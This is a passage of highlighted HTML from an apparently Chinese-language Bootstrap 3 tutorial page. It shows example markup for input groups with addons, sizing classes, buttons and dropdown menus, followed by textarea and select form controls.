class="hljs-string">&quot;input-group&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-addon&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;basic-addon1&quot;</span>&gt;</span>@<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Username&quot;</span> <span class="hljs-attr">aria-describedby</span>=<span class="hljs-string">&quot;basic-addon1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Recipient&#x27;s username&quot;</span> <span class="hljs-attr">aria-describedby</span>=<span class="hljs-string">&quot;basic-addon2&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-addon&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;basic-addon2&quot;</span>&gt;</span>@example.com<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-addon&quot;</span>&gt;</span>$<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;Amount (to the nearest dollar)&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-addon&quot;</span>&gt;</span>.00<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;basic-url&quot;</span>&gt;</span>Your vanity URL<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-addon&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;basic-addon3&quot;</span>&gt;</span>https://example.com/users/<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;basic-url&quot;</span> <span class="hljs-attr">aria-describedby</span>=<span class="hljs-string">&quot;basic-addon3&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>尺寸（调整大小）</li></ol></blockquote><p>为 <code>.input-group</code> 添加相应的尺寸类，其内部包含的元素将自动调整自身的尺寸。不需要为输入框组中的每个元素重复地添加控制尺寸的类。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group input-group-lg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-addon&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;sizing-addon1&quot;</span>&gt;</span>@<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Username&quot;</span> <span class="hljs-attr">aria-describedby</span>=<span class="hljs-string">&quot;sizing-addon1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-addon&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;sizing-addon2&quot;</span>&gt;</span>@<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Username&quot;</span> <span class="hljs-attr">aria-describedby</span>=<span class="hljs-string">&quot;sizing-addon2&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group input-group-sm&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-addon&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;sizing-addon3&quot;</span>&gt;</span>@<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Username&quot;</span> <span class="hljs-attr">aria-describedby</span>=<span class="hljs-string">&quot;sizing-addon3&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>作为额外元素的多选框和单选框</li></ol></blockquote><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-lg-6&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-addon&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /input-group --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /.col-lg-6 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-lg-6&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-addon&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /input-group --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /.col-lg-6 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /.row --&gt;</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>作为额外元素的按钮</li></ol></blockquote><p>为输入框组添加按钮需要额外添加一层嵌套，不是 <code>.input-group-addon</code>，而是添加 <code>.input-group-btn</code> 来包裹按钮元素。由于不同浏览器的默认样式无法被统一的重新赋值，所以才需要这样做。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-lg-6&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-btn&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Go!<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Search for...&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /input-group --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /.col-lg-6 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-lg-6&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Search for...&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-btn&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Go!<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /input-group --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /.col-lg-6 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /.row --&gt;</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>作为额外元素的按钮式下拉菜单</li></ol></blockquote><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-lg-6&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-btn&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span> <span class="hljs-attr">aria-haspopup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">aria-expanded</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span>Action <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Another action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Something else here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;separator&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Separated link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /btn-group --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /input-group --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /.col-lg-6 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-lg-6&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-btn&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span> <span class="hljs-attr">aria-haspopup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">aria-expanded</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span>Action <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu dropdown-menu-right&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Another action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Something else here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;separator&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Separated link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /btn-group --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /input-group --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /.col-lg-6 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /.row --&gt;</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>作为额外元素的分裂式按钮下拉菜单</li></ol></blockquote><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-btn&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- Button and dropdown menu --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-btn&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- Button and dropdown menu --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-5-文本域"><a href="#5-5-文本域" class="headerlink" title="5.5 文本域"></a>5.5 文本域</h3><p>支持多行文本的表单控件。可根据需要改变 <code>rows</code> 属性。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-6-下拉菜单"><a href="#5-6-下拉菜单" class="headerlink" title="5.6 下拉菜单"></a>5.6 下拉菜单</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>对于标记了 <code>multiple</code> 属性的 <code>&lt;select&gt;</code> 控件来说，默认显示多选项。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs 